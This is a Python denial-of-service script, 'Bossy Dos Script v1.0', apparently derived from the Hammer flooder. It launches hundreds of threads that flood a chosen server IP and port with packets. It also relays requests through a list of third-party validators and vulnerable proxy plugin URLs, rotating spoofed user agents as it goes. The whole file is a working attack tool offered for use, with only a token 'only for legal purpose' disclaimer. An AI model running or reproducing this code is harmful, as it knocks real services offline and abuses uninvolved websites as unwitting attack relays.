#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Bossy Dos Script v.1.0
# by Bossy
# only for legal purpose

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
import random
import time
import sys

class colors:
  W  = '\033[0m'  # white (default)
  R  = '\033[31m' # red
  G  = '\033[1;32m' # green bold
  O  = '\033[33m' # orange
  B  = '\033[34m' # blue
  P  = '\033[35m' # purple
  C  = '\033[36m' # cyan
  GR = '\033[37m' # gray
  cyanClaro="\033[1;36m"
  vermelho = '\033[31;1m'
  verde = '\033[32;1m'
  azul = '\033[34;1m'
  amarelo= '\033[1;33m'

def Animation(String):
    animation = "|/-\\"
    for i in range(15):
        time.sleep(0.1)
        sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + colors.G + String)
        sys.stdout.flush()
    print('')
def fastprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(1./50)


def user_agent():
	global uagent
	uagent=[]
	uagent.append("Googlebot/2.1 (+http://www.google.com/bot.html)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
	uagent.append("Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1")
	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41")
	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://validator.w3.org/feed/check.cgi?url=")
	bots.append("http://www.google.com/ig/adde?moduleurl=")
	bots.append("http://www.google.com/?q=")
	bots.append("http://www.google.com/ig/adde?moduleurl=")
	bots.append("http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=")
	bots.append("https://down.com/?q=")
	bots.append("http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=")
	bots.append("http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://www.feedvalidator.org/check.cgi?url=")
	bots.append("https://www.wizards.com/leaving.asp?url=")
	bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
	bots.append("http://feed.informer.com/validator/check.cgi?url=")
	bots.append("http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=")
	bots.append("https://html5.validator.nu/?doc=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94m [*] The Server İs Crashing ✓\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s = socket.socket(socket.SOCK_DGRAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m [*] Packet Sent ✓ AsparTim  \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m [!] No Connection ✓ Server Maybe Down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)
		


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()
		
class Ghost_Lab:
    Banner = """
   ***
  ** **
 **   **
 **   **         ****
 **   **       **   ****
 **  **       *   **   **
  **  *      *  **  ***  **
   **  *    *  **     **  *       [+] DDOS Internal Network
    ** **  ** **        **
    **   **  **               *********************************
   *           *              *        fb.com/bossy.078       *
  *             *             *********************************
 *    0     0    *            *      Coded By : BOSSY         *
 *   /   @   \   *            *    Telegram : @bossy.078      * 
 *   \__/ \__/   *            *                               *
   *     W     *              *********************************
     **     **                *      github.com/spoofing00    *
       *****                  *********************************"""
    Fast_Ban = """**************************************
* Denial of Internal Network Service * 
**************************************"""
    Status_Banner = """
+========================+
|         Status         |
+========================+"""
    End_Status = """+========================+"""

print(colors.azul+Ghost_Lab.Banner)
fastprint(colors.O+'\t\t\t\t Instagram :'+colors.P+' @bossy.078')
print(colors.GR + Ghost_Lab.Fast_Ban)




def usage():
	print(Ghost_Lab.End_Status)
	print (''' 	Hello My Friend's \n
	usage : python3 bossyv1.0.py [-u] [-p] [-v]
	-h : Help
	-u : Server İp
	-p : Port Default 80
	-v : Turbo Default 200 ''')
	sys.exit()

def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-u","--server", dest="host",help="attack to server ip -u ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-v","--turbo",type="int",dest="turbo",help="default 20 -v 200")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 200
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94m [*] Please Wait . . .\033[0m")
	user_agent()
	my_bots()
	time.sleep(1)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s = socket.socket(socket.SOCK_DGRAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91m [*] Check Server İp And Port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
